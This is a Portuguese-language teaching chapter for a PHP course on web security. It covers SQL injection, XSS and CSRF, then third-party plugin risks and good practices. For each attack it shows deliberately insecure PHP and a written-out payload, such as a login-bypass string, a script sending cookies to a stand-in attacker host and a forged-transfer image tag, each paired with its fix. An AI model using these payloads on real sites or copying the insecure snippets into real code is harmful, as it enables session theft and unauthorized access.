@@ -1,0 +1,159 @@
+---
+title: "Segurança em Aplicações Web"
+author: "João Pavão"
+date: 2026-08-24
+lang: pt-PT
+---
+
+## Vulnerabilidades no Código Próprio {#sec-09-codigo-proprio}
+
+A referência mais usada para classificar vulnerabilidades de aplicações
+web é o `OWASP Top 10`, uma lista dos riscos de segurança mais críticos,
+mantida pela *Open Worldwide Application Security Project* e atualizada
+periodicamente com base na análise de dezenas de milhares de
+vulnerabilidades reais [@owasp_top10_2025]. Três destas vulnerabilidades
+são particularmente relevantes para uma aplicação PHP como as
+desenvolvidas nesta UC:
+
+### SQL Injection {#sec-09-sql-injection}
+
+O SQL Injection ocorre quando dados fornecidos pelo utilizador são
+inseridos diretamente numa instrução SQL, permitindo que um atacante
+altere o significado dessa instrução. Considere-se um formulário de
+autenticação implementado de forma insegura, por concatenação direta:
+
+```php
+<?php
+$utilizador = $_POST["utilizador"];
+$password = $_POST["password"];
+
+$sql = "SELECT * FROM utilizadores WHERE utilizador = '$utilizador' AND password = '$password'";
+$resultado = $conexao->query($sql);
+```
+
+Se um atacante escrever, no campo `utilizador`, o texto
+`' OR '1'='1' -- `, a instrução SQL efetivamente executada passa a ser:
+
+```sql
+SELECT * FROM utilizadores WHERE utilizador = '' OR '1'='1' -- ' AND password = '...'
+```
+
+Como `'1'='1'` é sempre verdadeiro, e o `--` transforma o resto da linha
+num comentário SQL, ignorando a verificação da password, esta consulta
+devolve o primeiro utilizador da tabela, permitindo ao atacante iniciar
+sessão sem conhecer nenhuma password válida. É evitada usando sempre
+*prepared statements*, como visto no @sec-08-prepared-statements, que
+tratam o conteúdo de `$_POST` sempre como um valor, nunca como parte do
+comando SQL, independentemente do que esse valor contenha.
+
+### XSS (Cross-Site Scripting) {#sec-09-xss}
+
+O XSS ocorre quando dados fornecidos por um utilizador são apresentados
+a outros utilizadores sem serem devidamente tratados, permitindo a um
+atacante injetar código JavaScript que corre no *browser* de quem
+visualiza essa página. Considere-se uma caixa de comentários que mostra
+o texto submetido diretamente:
+
+```php
+<?php
+echo "<p>" . $_POST["comentario"] . "</p>";
+```
+
+Se um atacante submeter, como comentário, o texto
+`<script>document.location='http://atacante.com/roubo?c='+document.cookie</script>`,
+esse código JavaScript passa a fazer parte da página tal como qualquer
+outro, e é executado automaticamente no *browser* de qualquer outro
+utilizador que visite essa página, podendo, por exemplo, enviar os seus
+*cookies* de sessão para um servidor controlado pelo atacante. É evitada
+escapando sempre conteúdo gerado por utilizadores antes de o apresentar
+em HTML, com a função `htmlspecialchars()`, que transforma carateres
+especiais de HTML, como `<` e `>`, nas suas versões inofensivas:
+
+```php
+<?php
+echo "<p>" . htmlspecialchars($_POST["comentario"]) . "</p>";
+```
+
+Desta forma, o texto do atacante é mostrado literalmente na página, como
+texto visível, e não interpretado como código.
+
+### CSRF (Cross-Site Request Forgery) {#sec-09-csrf}
+
+O CSRF ocorre quando um atacante induz o *browser* de um utilizador já
+autenticado a enviar, sem que este se aperceba, um pedido a uma
+aplicação onde tem sessão iniciada, explorando o facto de o *browser*
+enviar automaticamente os *cookies* de sessão em qualquer pedido a esse
+domínio, tal como visto no @sec-07-cookies. Imagine-se uma aplicação
+bancária com uma transferência implementada como um simples pedido
+`GET`:
+
+```
+GET /transferir?destino=1234&valor=500
+```
+
+Se um utilizador, autenticado nesse banco, visitar, noutro separador do
+*browser*, uma página maliciosa que contenha
+`<img src="https://banco.com/transferir?destino=1234&valor=500">`, o
+*browser* tenta carregar essa "imagem", enviando automaticamente o
+pedido ao banco, junto com o *cookie* de sessão válido do utilizador,
+sem que este tenha clicado em nada. É evitada de duas formas
+complementares: nunca implementar operações que alterem dados como um
+simples `GET`, tal como já recomendado no @sec-07-get-vs-post, e
+incluir, em cada formulário sensível, um token único e imprevisível,
+gerado pelo servidor e verificado antes de processar o pedido, que uma
+página maliciosa, alojada noutro domínio, não tem forma de conhecer nem
+reproduzir.
+
+Em todos estes casos, o princípio subjacente é o mesmo: nunca confiar em
+dados vindos do cliente, seja de um formulário, de um parâmetro na URL
+ou de um *cookie*, sem primeiro os validar e tratar adequadamente.
+
+## Vulnerabilidades em Dependências de Terceiros {#sec-09-dependencias}
+
+A superfície de ataque de um sítio web não se limita ao código escrito
+diretamente pelo seu programador. Grande parte dos sítios web atuais é
+construída sobre sistemas de gestão de conteúdos, como o `WordPress`,
+estendidos através de extensões (*plugins*) desenvolvidas por terceiros,
+muitas vezes por equipas pequenas ou até um único programador
+independente. Segundo o relatório de segurança da Patchstack referente a
+2025, 91% das vulnerabilidades encontradas no ecossistema WordPress
+nesse ano estavam localizadas em *plugins*, não no núcleo do
+`WordPress`, e mais de metade das infeções registadas resultaram de
+*plugins* desatualizados [@patchstack_2025_report].
+
+Esta realidade levou a atualização mais recente do OWASP Top 10 a
+introduzir uma categoria dedicada a falhas na cadeia de fornecimento de
+*software* (*Software Supply Chain Failures*), reconhecendo que a
+segurança de uma aplicação depende também da segurança de todas as
+bibliotecas, *frameworks* e extensões de que esta depende, e não apenas
+do código escrito pela própria equipa [@owasp_top10_2025]. É por esta
+razão que, na prática, os serviços de alojamento suspendem por vezes o
+acesso a um sítio web até que as suas dependências vulneráveis sejam
+atualizadas: a vulnerabilidade pode não estar em nenhuma linha de código
+escrita pelo dono do sítio, mas o risco que representa é igualmente
+real.
+
+## Boas Práticas {#sec-09-boas-praticas}
+
+Algumas práticas simples reduzem significativamente o risco de segurança
+de uma aplicação web:
+
+- **Atualizações regulares**: manter o *software* de base (o próprio
+  PHP, o servidor web, o sistema de gestão de bases de dados) e todas as
+  dependências e extensões de terceiros atualizadas para a versão mais
+  recente, já que muitas vulnerabilidades só são exploradas depois de
+  serem publicamente conhecidas;
+- **Princípio do menor privilégio**: cada componente de uma aplicação, e
+  cada utilizador da base de dados, deve ter apenas as permissões
+  estritamente necessárias ao seu funcionamento, nunca acesso total por
+  comodidade;
+- **Validação e sanitização de dados**: tratar sempre com desconfiança
+  qualquer dado que venha do exterior da aplicação, validando o seu
+  formato e sanitizando o seu conteúdo antes de o usar, seja numa
+  consulta à base de dados, seja numa página apresentada a outro
+  utilizador.
+
+## Referências {#sec-09-referencias .unnumbered}
+
+::: {#refs}
+:::
